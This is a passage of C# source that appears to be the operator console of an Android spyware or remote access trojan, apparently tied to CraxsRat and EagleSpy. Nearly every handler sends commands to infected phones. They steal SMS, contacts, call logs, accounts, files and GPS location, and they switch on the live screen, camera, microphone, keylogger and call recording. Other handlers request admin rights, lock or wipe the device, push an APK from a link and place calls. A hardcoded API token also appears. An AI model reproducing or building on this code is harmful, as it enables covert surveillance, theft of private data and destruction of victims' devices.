                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
	}

	private void ToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (DataLog.Rows.Count <= 0 || DataLog.SelectedRows.Count <= 0)
			return;
		DataGridViewRow dataGridViewRow = DataLog.SelectedRows[0];
		if (dataGridViewRow == null)
			return;
		checked
		{
			try
			{
				int num = server.Count - 1;
				for (int i = 0; i <= num; i++)
				{
					try
					{
						if (!server[i].Blocklist.Contains(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", "")))
						{
							server[i].Blocklist.Add(dataGridViewRow.Cells[1].Value.ToString().Replace(" ", ""));
							Data.MainForm.DGVblocked.Rows.Add(GetFlagThisIp.ThisIp(dataGridViewRow.Cells[1].Value.ToString()), dataGridViewRow.Cells[1].Value.ToString());
						}
					}
					catch (Exception)
					{
                        //ProjectData.SetProjectError(projectError);
                        //////CraxsAlert.Showinformation("Sorry");
                    }
                }
			}
			catch (Exception)
			{
                //ProjectData.SetProjectError(projectError2);
                //////CraxsAlert.Showinformation("Sorry");
            }
        }
	}

	private void Clearsrchbtn_Click(object sender, EventArgs e)
	{
		searchtext.Text = "";
	}

	private void Mapupdater_Tick(object sender, EventArgs e)
	{
	}

	private void Mainbatteryico_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("");
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void DrakeUIImageButton1_Click(object sender, EventArgs e)
	{
	}

	private void Battarypic_MouseEnter(object sender, EventArgs e)
	{
	}

	private void DrakeUIButtonIcon2_Click(object sender, EventArgs e)
	{
		try
		{
			Process.Start("https://telegram.me/eaglespy");
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern bool HideCaret(IntPtr hWnd);

	private void targetCtext_GotFocus(object sender, EventArgs e)
	{
	}

	private void FilesToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							object[] parametersObjects = new object[4]
							{
								client.myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".files" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getfiles + Data.SPL_SOCKET + "files" + Data.SPL_DATA + "get0",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void SMSToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".sms" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getSMS + Data.SPL_SOCKET + "sms" + Data.SPL_DATA + "content://sms/",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void CallsToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".calls" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getCalls + Data.SPL_SOCKET + "calls",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ContactsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".contacts" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getContacts + Data.SPL_SOCKET + "contacts",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void AccountsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Account + Data.SPL_SOCKET + "account",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ApplicationsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".apps" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.Apps + Data.SPL_SOCKET + "apps",
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	public string formnames(string input, string pass)
	{
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		new MD5CryptoServiceProvider();
		string text = "";
		ASCIIEncoding aSCIIEncoding = new ASCIIEncoding();
		byte[] bytes = aSCIIEncoding.GetBytes(pass);
		try
		{
			rijndaelManaged.Key = bytes;
			rijndaelManaged.Mode = CipherMode.ECB;
			ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
			byte[] array = Convert.FromBase64String(input);
			return Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array, 0, array.Length));
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError);
            //////CraxsAlert.Showinformation("Sorry");
        }
        return "";
	}

	private void ScreenMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Live_Screen_" + client.ClientRemoteAddress;
						ScreenShoter screenShoter = (ScreenShoter)MyProject.Application.OpenForms[name];
						if (screenShoter == null)
						{
							screenShoter = new ScreenShoter();
							screenShoter.Name = name;
							screenShoter.Title = string.Format("{0} - IP:{1}", "Live Screen", client.ClientAddressIP);
							screenShoter.Tag = client.ClientRemoteAddress;
							screenShoter.classClient = client;
							screenShoter.Client = client.myClient;
							screenShoter.DownloadsFolder = client.FolderUSER;
							screenShoter.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ScreenReaderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Screen_Reader_" + client.ClientRemoteAddress;
						ScreenReader screenReader = (ScreenReader)MyProject.Application.OpenForms[name];
						if (screenReader == null)
						{
							screenReader = new ScreenReader();
							screenReader.Name = name;
							screenReader.Title = string.Format("{0} - IP:{1}", "Screen Reader", client.ClientAddressIP);
							screenReader.Tag = client.ClientRemoteAddress;
							screenReader.Classclient = client;
							screenReader.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void CameraMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					TcpClient myClient = client.myClient;
					string[] array = client.Keys.Split(':');
					int num = 0;
					int num2 = 0;
					if (client.Isv4)
					{
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "lcm<*>" + client.ClientRemoteAddress + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(num) + Data.SPL_SOCKET + Conversions.ToString(num2) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
					else
					{
						string name = "Camera_Manager_" + client.ClientRemoteAddress;
						CameraManager cameraManager = (CameraManager)MyProject.Application.OpenForms[name];
						if (cameraManager != null)
							break;
						cameraManager = new CameraManager();
						cameraManager.Name = name;
						cameraManager.Title = string.Format("{0} - IP:{1}", "Camera Manager", client.ClientAddressIP);
						cameraManager.classClient = client;
						if (cameraManager.classClient != null)
						{
							reso.Directory_Exist(cameraManager.classClient);
							cameraManager.tmpFolderUSER = cameraManager.classClient.FolderUSER;
						}
						cameraManager.Client = client.myClient;
						cameraManager.classCamera = client;
						cameraManager.TempImage = new PictureBox();
						cameraManager.combotext.Visible = false;
						cameraManager.combosizes.Visible = false;
						cameraManager.Show();
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void MicrophoneMonitorToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					TcpClient myClient = client.myClient;
					string name = "Microphone_" + client.ClientRemoteAddress;
					/*Microphone microphone = (Microphone)MyProject.Application.OpenForms[name];
					if (microphone == null)*/
					{
						string[] array = client.Keys.Split(':');
						if (array.Length < infoServer.KeySize)
							break;
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".microphone" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "start" + Data.SPL_DATA + array[0] + Data.SPL_DATA + array[1] + Data.SPL_DATA + "8000" + Data.SPL_DATA + SecurityKey.MicwaveOutByte + Data.SPL_DATA + client.ClientRemoteAddress + Data.SPL_DATA + "0",
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void KeyloggerToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						string name = "Keylogger_" + client.ClientRemoteAddress;
						Keylogger keylogger = (Keylogger)MyProject.Application.OpenForms[name];
						if (client != null && keylogger == null)
						{
							keylogger = new Keylogger();
							keylogger.Name = name;
							keylogger.Title = string.Format("{0} - IP:{1}", "Keylogger", client.ClientAddressIP);
							keylogger.Client = client.myClient;
							keylogger.classClient = client;
							keylogger.DGV0.Columns[3].Width = 48;
							keylogger.DGV0.Columns[3].DisplayIndex = 0;
							keylogger.tmpAddressIP = client.ClientAddressIP;
							keylogger.tmpClientName = client.ClientName;
							keylogger.tmpCountry = client.Country;
							keylogger.tmpFolderUSER = client.FolderUSER;
							client.Keylogg = true;
							keylogger.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void LiveModeToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient3 + Data.SPL_SOCKET + Data.SPL_DATA + Data.SPL_SOCKET + SecurityKey.getGPS,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void SilentModeGOIPToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					string[] latLng = Data.cityclass.GetLatLng(client.ClientAddressIP);
					if (latLng == null)
						continue;
					string name = "Location_Manager_" + client.ClientRemoteAddress;
					LocationManager locationManager = (LocationManager)MyProject.Application.OpenForms[name];
					if (locationManager == null)
					{
						reso.Directory_Exist(client);
						locationManager = new LocationManager();
						locationManager.infoMaps = new string[2] { client.FolderUSER, client.ClientName };
						locationManager.Name = name;
						locationManager.Title = string.Format("{0} - IP:{1}", "Location Manager", client.ClientAddressIP);
						locationManager.Client = client.myClient;
						locationManager.classClient = client;
						locationManager.Issilent = true;
						locationManager.tmpFolderUSER = client.FolderUSER;
						if (!Directory.Exists(locationManager.tmpFolderUSER))
							Directory.CreateDirectory(locationManager.tmpFolderUSER);
						locationManager.Show();
						locationManager.Zoom = 15;
					}
					locationManager.ImageSize.Width = 480;
					locationManager.ImageSize.Height = 360;
					locationManager.Markers = reso.Between("<param name=\"markers_gsm\">", "</param>");
					locationManager.Link = "https://api.mapbox.com/styles/v1/";
					locationManager.Key = "pk.eyJ1IjoiYWxmYWtyYWtlbiIsImEiOiJja3h1Z283bWMzbDNhMnlxa3VpeDdmejZjIn0.K8KkGJxQgTUJroiFHsrewA";
					string text = reso.Maps_style();
					locationManager.style = reso.Between("<param name=\"" + text + "\">", "</param>");
					locationManager.Accuracy = "jump";
					locationManager.Speed = "jump";
					locationManager.List.Add(new double[2]
					{
						Conversions.ToDouble(latLng[0]),
						Conversions.ToDouble(latLng[1])
					});
					locationManager.Text = locationManager.Title;
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void WebBrowserToolStripMenuItem1_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Web_Browser_" + client.ClientAddressIP;
						WebViewMonitor webViewMonitor = (WebViewMonitor)MyProject.Application.OpenForms[name];
						if (webViewMonitor == null)
						{
							webViewMonitor = new WebViewMonitor();
							webViewMonitor.Name = name;
							webViewMonitor.Title = string.Format("{0} - IP:{1}", "Web Browser", client.ClientAddressIP);
							webViewMonitor.Tag = client.ClientAddressIP;
							webViewMonitor.Classclient = client;
							webViewMonitor.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void CallRecorderToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						string name = "Calls_Records_" + client.ClientAddressIP;
						Calls_Records calls_Records = (Calls_Records)MyProject.Application.OpenForms[name];
						if (calls_Records == null)
						{
							calls_Records = new Calls_Records();
							calls_Records.Name = name;
							calls_Records.Title = string.Format("{0} - IP:{1}", "Calls Records", client.ClientAddressIP);
							calls_Records.Tag = client.ClientRemoteAddress;
							calls_Records.ClassClient = client;
							calls_Records.Client = client.myClient;
							calls_Records.DownloadsFolder = client.FolderUSER;
							calls_Records.Show();
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	

	private void RequestAdminRightsToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							string[] array = client.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								string.Concat(SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>", Data.SPL_SOCKET, array[0], Data.SPL_SOCKET, array[1], Data.SPL_SOCKET, SecurityKey.Lockscreen, Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Conversions.ToString(0), Data.SPL_SOCKET, Data.SPL_ARRAY, Data.SPL_SOCKET, client.ClientRemoteAddress),
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void LockScreenToolStripMenuItem_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							string[] array = client.Keys.Split(':');
							object[] parametersObjects = new object[4]
							{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>lck<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
							};
							client.SendMessage(parametersObjects);
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem2_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						switch (Interaction.MsgBox("All Phone Data Will be Removed\r\nAre you sure you want to Continue", MsgBoxStyle.YesNo, "Alert"))
						{
							case MsgBoxResult.No:
								return;
							case MsgBoxResult.Yes:
								{
									string[] array = client.Keys.Split(':');
									object[] parametersObjects = new object[4]
									{
								myClient,
								SecurityKey.KeysClient2 + Data.SPL_SOCKET + "adm<*>wip<*>" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
								Codes.Encoding().GetBytes("null"),
								client
									};
									client.SendMessage(parametersObjects);
									break;
								}
						}
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem5_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client == null)
						continue;
					TcpClient myClient = client.myClient;
					CallPhone callPhone = new CallPhone();
					callPhone.L0.Text = "add Number";
					callPhone.StartPosition = FormStartPosition.Manual;
					callPhone.Location = Codes.FixSize(Data.MainForm, callPhone);
					string text = null;
					string text2 = null;
					if (callPhone.ShowDialog() == DialogResult.OK)
					{
						text = callPhone.TextBox1.Text;
						text2 = callPhone._Call;
						callPhone.Close();
						if (Operators.CompareString(text, null, TextCompare: false) == 0)
							continue;
						try
						{
							if (client != null)
							{
								object[] parametersObjects = new object[4]
								{
									myClient,
									SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + text2 + Data.SPL_DATA + "tel:" + text.Trim(),
									Codes.Encoding().GetBytes("null"),
									client
								};
								client.SendMessage(parametersObjects);
							}
						}
						finally
						{
						}
						continue;
					}
					callPhone.Close();
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem6_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter APK Link";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
							break;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + reso.ChekLink(dialog.Mytext.Text) + ":up" + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem7_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag == null)
						continue;
					Client client = (Client)selectedRow.Cells[8].Tag;
					if (client != null)
					{
						TcpClient myClient = client.myClient;
						Dialog1 dialog = new Dialog1();
						dialog.Title = "Enter Messege";
						dialog.ShowDialog();
						if (dialog.DialogResult != DialogResult.OK)
							break;
						string[] array = client.Keys.Split(':');
						object[] parametersObjects = new object[4]
						{
							myClient,
							SecurityKey.KeysClient2 + Data.SPL_SOCKET + "msg:" + dialog.Mytext.Text + Data.SPL_SOCKET + array[0] + Data.SPL_SOCKET + array[1] + Data.SPL_SOCKET + SecurityKey.Lockscreen + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Conversions.ToString(0) + Data.SPL_SOCKET + Data.SPL_ARRAY + Data.SPL_SOCKET + client.ClientRemoteAddress,
							Codes.Encoding().GetBytes("null"),
							client
						};
						client.SendMessage(parametersObjects);
					}
				}
				catch (Exception)
				{
                    //ProjectData.SetProjectError(projectError);
                    //////CraxsAlert.Showinformation("Sorry");
                }
            }
		}
		catch (Exception)
		{
            //ProjectData.SetProjectError(projectError2);
            //////CraxsAlert.Showinformation("Sorry");
        }
    }

	private void ToolStripMenuItem8_Click(object sender, EventArgs e)
	{
		if (ClientsWindow.SelectedRows.Count <= 0)
			return;
		try
		{
			foreach (DataGridViewRow selectedRow in ClientsWindow.SelectedRows)
			{
				try
				{
					if (selectedRow.Tag != null)
					{
						Client client = (Client)selectedRow.Cells[8].Tag;
						if (client != null)
						{
							TcpClient myClient = client.myClient;
							object[] parametersObjects = new object[4]
							{
								myClient,
